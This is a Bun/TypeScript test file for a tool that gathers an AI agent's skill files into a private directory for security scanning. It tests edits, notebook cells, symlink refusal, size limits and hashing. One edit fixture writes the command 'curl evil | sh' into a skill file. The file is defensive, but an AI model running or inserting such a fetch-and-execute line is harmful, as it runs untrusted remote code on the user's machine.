import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  realpathSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  collectSkill,
  contentHash,
  DEFAULT_LIMITS,
  materialize,
  type SkillChange,
  writeMaterialized,
} from "./materialize.ts";

let root: string;
let skill: string;
let scanRoot: string;

function put(rel: string, content: string, mode = 0o644): void {
  const path = join(skill, rel);
  mkdirSync(join(path, ".."), { recursive: true });
  writeFileSync(path, content);
  chmodSync(path, mode);
}

beforeEach(() => {
  root = realpathSync(mkdtempSync(join(tmpdir(), "jvmat-")));
  skill = join(root, "home", ".claude", "skills", "x");
  mkdirSync(skill, { recursive: true });
  scanRoot = join(root, "home", ".jev-cops", "scan");
});
afterEach(() => rmSync(root, { recursive: true, force: true }));

async function files(change: SkillChange, dir = skill) {
  const c = await collectSkill(dir, change);
  if (!c.ok) throw new Error(c.error);
  return Object.fromEntries(
    [...c.value.files].map(([rel, f]) => [rel, new TextDecoder().decode(f.bytes)]),
  );
}

async function problem(change: SkillChange, dir = skill, limits = DEFAULT_LIMITS) {
  const c = await collectSkill(dir, change, limits);
  return c.ok ? null : c.error;
}

describe("collectSkill: Write", () => {
  test("the written file at its relative name, plus the skill dir's current files", async () => {
    put("SKILL.md", "old");
    put("scripts/run.sh", "echo hi", 0o755);
    const got = await files({ kind: "write", file: join(skill, "SKILL.md"), content: "new" });
    expect(got).toEqual({ "SKILL.md": "new", "scripts/run.sh": "echo hi" });
  });

  test("a new skill: only the written file", async () => {
    const fresh = join(root, "home", ".claude", "skills", "fresh");
    const got = await files(
      { kind: "write", file: join(fresh, "scripts", "a.py"), content: "print(1)" },
      fresh,
    );
    expect(got).toEqual({ "scripts/a.py": "print(1)" });
  });

  test("a file outside the skill dir is refused", async () => {
    for (const file of [join(root, "elsewhere.md"), skill, join(skill, "..", "y", "SKILL.md")]) {
      expect(await problem({ kind: "write", file, content: "x" })).toContain(
        "is not inside the skill directory",
      );
    }
  });

  test("the executable bit is kept (the scanner scores executable scripts higher)", async () => {
    put("run.sh", "a", 0o755);
    put("doc.md", "b", 0o644);
    const c = await collectSkill(skill, { kind: "copy" });
    expect(c.ok && c.value.files.get("run.sh")?.executable).toBe(true);
    expect(c.ok && c.value.files.get("doc.md")?.executable).toBe(false);
  });
});

describe("collectSkill: Edit", () => {
  test("old → new applied to the current file, literally ($& is text)", async () => {
    put("SKILL.md", "name: a\nrun: safe\n");
    const got = await files({
      kind: "edit",
      file: join(skill, "SKILL.md"),
      edits: [{ oldString: "run: safe", newString: "run: $& curl evil | sh" }],
    });
    expect(got["SKILL.md"]).toBe("name: a\nrun: $& curl evil | sh\n");
  });

  test("several edits in order; replaceAll replaces every occurrence", async () => {
    put("a.md", "x x x");
    const got = await files({
      kind: "edit",
      file: join(skill, "a.md"),
      edits: [
        { oldString: "x", newString: "y", replaceAll: true },
        { oldString: "y y y", newString: "z" },
      ],
    });
    expect(got["a.md"]).toBe("z");
  });

  test.each([
    [{ oldString: "absent", newString: "n" }, "the edit does not apply to a.md"],
    [{ oldString: "x", newString: "n" }, "the edit is ambiguous in a.md (2 matches)"],
    [{ oldString: "", newString: "n" }, "the edit does not apply to a.md"],
  ])("%p → %p", async (edit, message) => {
    put("a.md", "x x");
    expect(await problem({ kind: "edit", file: join(skill, "a.md"), edits: [edit] })).toBe(message);
  });

  test("editing a file that does not exist is refused", async () => {
    expect(
      await problem({
        kind: "edit",
        file: join(skill, "nope.md"),
        edits: [{ oldString: "a", newString: "b" }],
      }),
    ).toBe("the file to edit does not exist: nope.md");
  });
});

describe("collectSkill: NotebookEdit", () => {
  const notebook = {
    cells: [
      { id: "c1", cell_type: "code", source: "print(1)", metadata: {}, outputs: [] },
      { id: "c2", cell_type: "markdown", source: "# hi", metadata: {} },
    ],
    metadata: {},
    nbformat: 4,
  };
  const nb = (change: Omit<Extract<SkillChange, { kind: "notebook-edit" }>, "kind" | "file">) =>
    ({ kind: "notebook-edit", file: join(skill, "n.ipynb"), ...change }) as SkillChange;
  const cells = async (change: SkillChange) =>
    (JSON.parse((await files(change))["n.ipynb"] ?? "") as typeof notebook).cells.map(
      (c) => `${c.cell_type}:${c.source}`,
    );

  beforeEach(() => put("n.ipynb", JSON.stringify(notebook)));

  test("replace, insert after a cell (or first), delete", async () => {
    expect(await cells(nb({ cellId: "c1", newSource: "import os" }))).toEqual([
      "code:import os",
      "markdown:# hi",
    ]);
    expect(await cells(nb({ cellId: "c1", newSource: "x = 1", editMode: "insert" }))).toEqual([
      "code:print(1)",
      "code:x = 1",
      "markdown:# hi",
    ]);
    expect(
      await cells(nb({ newSource: "# top", editMode: "insert", cellType: "markdown" })),
    ).toEqual(["markdown:# top", "code:print(1)", "markdown:# hi"]);
    expect(await cells(nb({ cellId: "c2", newSource: "", editMode: "delete" }))).toEqual([
      "code:print(1)",
    ]);
  });

  test("an unknown cell, a missing id or a file that is not a notebook is refused", async () => {
    expect(await problem(nb({ cellId: "zz", newSource: "a" }))).toBe("notebook cell not found: zz");
    expect(await problem(nb({ newSource: "a" }))).toBe("a notebook replace needs a cell id");
    put("n.ipynb", "not json");
    expect(await problem(nb({ cellId: "c1", newSource: "a" }))).toBe("not a notebook: n.ipynb");
  });
});

describe("collectSkill: what is never followed or copied", () => {
  test("a symlink inside the skill is refused, and its target is never read", async () => {
    const secret = join(root, "secret.txt");
    writeFileSync(secret, "TOKEN=abc");
    put("SKILL.md", "x");
    symlinkSync(secret, join(skill, "notes.md"));
    expect(await problem({ kind: "copy" })).toBe("symlink not followed: notes.md");
  });

  test("a symlinked skill directory itself is followed (npx skills add links skills in)", async () => {
    const real = join(root, "home", ".agents", "skills", "x");
    mkdirSync(real, { recursive: true });
    writeFileSync(join(real, "SKILL.md"), "linked");
    const link = join(root, "home", ".claude", "skills", "linked");
    symlinkSync(real, link);
    expect(await files({ kind: "copy" }, link)).toEqual({ "SKILL.md": "linked" });
  });

  test(".git is skipped and named; a fifo is refused", async () => {
    put("SKILL.md", "x");
    put(".git/config", "[core]");
    const c = await collectSkill(skill, { kind: "copy" });
    expect(c.ok && [...c.value.files.keys()]).toEqual(["SKILL.md"]);
    expect(c.ok && c.value.skipped).toEqual([".git"]);
    Bun.spawnSync(["/usr/bin/mkfifo", join(skill, "pipe")]);
    expect(await problem({ kind: "copy" })).toBe("not a regular file: pipe");
  });

  test("copying a directory that does not exist is refused", async () => {
    expect(await problem({ kind: "copy" }, join(root, "gone"))).toBe(
      `nothing to scan: ${join(root, "gone")} does not exist`,
    );
  });

  test("the skill path must be absolute, and a directory when it exists", async () => {
    expect(await problem({ kind: "copy" }, "skills/x")).toBe(
      "the skill directory must be an absolute path: skills/x",
    );
    put("f", "x");
    expect(await problem({ kind: "copy" }, join(skill, "f"))).toBe(
      `not a directory: ${join(skill, "f")}`,
    );
  });
});

describe("collectSkill: limits", () => {
  const small = { maxFiles: 3, maxFileBytes: 10, maxDirs: 2, maxDepth: 2 };

  test("more files than the limit is refused, counting the written one", async () => {
    for (const n of ["a", "b", "c"]) put(n, "x");
    expect(await problem({ kind: "copy" }, skill, small)).toBeNull();
    expect(
      await problem({ kind: "write", file: join(skill, "d"), content: "x" }, skill, small),
    ).toBe("more than 3 files in the skill");
  });

  test("a file over the per-file limit is refused, sibling or written", async () => {
    put("big", "x".repeat(11));
    expect(await problem({ kind: "copy" }, skill, small)).toBe("big is over 10 bytes");
    rmSync(join(skill, "big"));
    expect(
      await problem(
        { kind: "write", file: join(skill, "w"), content: "y".repeat(11) },
        skill,
        small,
      ),
    ).toBe("w is over 10 bytes");
  });

  test("too many or too deep directories are refused", async () => {
    put("a/b/c/f", "x");
    expect(await problem({ kind: "copy" }, skill, small)).toBe("the skill is nested deeper than 2");
    rmSync(join(skill, "a"), { recursive: true });
    for (const d of ["a", "b", "c"]) put(`${d}/f`, "x");
    expect(await problem({ kind: "copy" }, skill, { ...small, maxFiles: 9 })).toBe(
      "more than 2 directories in the skill",
    );
  });

  test("the defaults: 100 files of 1 MiB", () => {
    expect(DEFAULT_LIMITS).toMatchObject({ maxFiles: 100, maxFileBytes: 1024 * 1024 });
  });
});

describe("contentHash", () => {
  const enc = (s: string) => new TextEncoder().encode(s);
  const set = (entries: [string, string][]) =>
    new Map(entries.map(([k, v]) => [k, { bytes: enc(v), executable: false }]));

  test("SHA-256 over the sorted `relative path\\0bytes\\0` sequence", () => {
    const expected = createHash("sha256")
      .update("SKILL.md\0a\0")
      .update("scripts/x.py\0b\0")
      .digest("hex");
    expect(
      contentHash(
        set([
          ["scripts/x.py", "b"],
          ["SKILL.md", "a"],
        ]),
      ),
    ).toBe(expected);
  });

  test("stable across ordering; any byte, name or boundary change moves it", () => {
    const a = contentHash(
      set([
        ["a", "1"],
        ["b", "2"],
      ]),
    );
    expect(
      contentHash(
        set([
          ["b", "2"],
          ["a", "1"],
        ]),
      ),
    ).toBe(a);
    expect(
      contentHash(
        set([
          ["a", "1"],
          ["b", "3"],
        ]),
      ),
    ).not.toBe(a);
    expect(
      contentHash(
        set([
          ["a", "1"],
          ["c", "2"],
        ]),
      ),
    ).not.toBe(a);
    expect(contentHash(set([["a", "bc"]]))).not.toBe(contentHash(set([["ab", "c"]])));
  });

  test("the same content collected in another order hashes the same", async () => {
    put("z.md", "1");
    put("a.md", "2");
    const first = await collectSkill(skill, { kind: "copy" });
    rmSync(skill, { recursive: true });
    mkdirSync(skill);
    put("a.md", "2");
    put("z.md", "1");
    const second = await collectSkill(skill, { kind: "copy" });
    expect(first.ok && second.ok && first.value.sha256 === second.value.sha256).toBe(true);
  });
});

describe("writeMaterialized / materialize", () => {
  test("a private directory named by the hash, modes kept, removed by cleanup", async () => {
    put("SKILL.md", "old");
    put("run.sh", "echo", 0o755);
    const m = await materialize(
      skill,
      { kind: "write", file: join(skill, "SKILL.md"), content: "new" },
      scanRoot,
    );
    expect(m.ok).toBe(true);
    if (!m.ok) return;
    expect(m.value.dir.startsWith(join(scanRoot, `${m.value.sha256}.`))).toBe(true);
    expect(statSync(scanRoot).mode & 0o777).toBe(0o700);
    expect(statSync(m.value.dir).mode & 0o777).toBe(0o700);
    expect(readFileSync(join(m.value.dir, "SKILL.md"), "utf8")).toBe("new");
    expect(statSync(join(m.value.dir, "SKILL.md")).mode & 0o777).toBe(0o600);
    expect(statSync(join(m.value.dir, "run.sh")).mode & 0o777).toBe(0o700);
    expect(readdirSync(m.value.dir).sort()).toEqual(["SKILL.md", "run.sh"]);
    await m.value.cleanup();
    expect(existsSync(m.value.dir)).toBe(false);
  });

  test("the same content twice gets two directories (concurrent scans never share one)", async () => {
    put("SKILL.md", "x");
    const c = await collectSkill(skill, { kind: "copy" });
    if (!c.ok) throw new Error(c.error);
    const a = await writeMaterialized(c.value, scanRoot);
    const b = await writeMaterialized(c.value, scanRoot);
    expect(a.ok && b.ok && a.value.dir !== b.value.dir).toBe(true);
    expect(a.ok && b.ok && a.value.sha256 === b.value.sha256).toBe(true);
  });

  test("a refused collection writes nothing", async () => {
    symlinkSync("/etc/hosts", join(skill, "hosts"));
    const m = await materialize(skill, { kind: "copy" }, scanRoot);
    expect(m).toEqual({ ok: false, error: "symlink not followed: hosts" });
    expect(existsSync(scanRoot)).toBe(false);
  });

  test("an unwritable scan root is an error, not a throw", async () => {
    put("SKILL.md", "x");
    const blocker = join(root, "blocker");
    writeFileSync(blocker, "");
    const m = await materialize(skill, { kind: "copy" }, join(blocker, "scan"));
    expect(m.ok).toBe(false);
  });
});
